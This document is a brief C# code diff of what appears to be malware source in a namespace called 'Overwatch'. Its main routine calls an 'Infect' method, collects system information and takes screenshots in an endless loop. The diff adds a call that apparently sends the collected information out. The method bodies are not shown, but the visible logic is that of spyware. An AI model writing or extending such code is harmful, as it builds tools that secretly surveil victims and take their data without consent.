@@ -1,8 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Text;
-using System.Diagnostics;
 
 namespace Overwatch
 {
@@ -18,6 +14,7 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
+                cSendingInformation.Sending();
                 while (true)
                 { 
                     info.ScreenShoot();
